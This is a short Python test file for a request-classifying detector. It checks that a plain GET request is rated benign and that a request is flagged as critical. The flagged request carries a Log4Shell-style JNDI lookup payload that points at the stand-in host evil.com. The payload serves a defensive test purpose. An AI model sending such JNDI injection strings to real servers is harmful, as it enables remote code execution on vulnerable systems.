from detector.inference import ProductDetector


def test_detector_labels_plain_payload_as_malicious():
    detector = ProductDetector(model_name="regex")
    result = detector.predict("GET /?x=${jndi:ldap://evil.com/a}")
    assert result.label == "malicious"
    assert result.risk_level == "critical"
    assert "jndi" in result.detected_patterns


def test_detector_keeps_simple_benign_low():
    detector = ProductDetector(model_name="regex")
    result = detector.predict("GET /home HTTP/1.1")
    assert result.label == "benign"
    assert result.risk_level == "low"
